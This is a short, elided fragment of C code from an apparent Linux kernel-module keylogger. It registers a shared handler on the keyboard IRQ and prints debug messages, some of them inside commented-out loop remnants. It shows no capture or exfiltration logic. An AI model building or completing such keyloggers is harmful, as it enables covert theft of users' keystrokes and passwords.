...
void tasklet_logger(unsigned long);
...
//for (i =0; i < 5000000 ;i++){
	...
	ret = request_irq( KB_IRQ , kb_irq_handler, IRQF_SHARED, "custom handler", (void *)(kb_irq_handler) );
	
	printk(KERN_INFO "%d" ,  ret);
        if(ret != 0){
		printk(KERN_INFO "progress");
                printk(KERN_INFO "keylogger: Cannot request IRQ for keyboard.\n");
        }else{
		printk(KERN_INFO "found %d" ,  i);
//	break;
	}
//	}
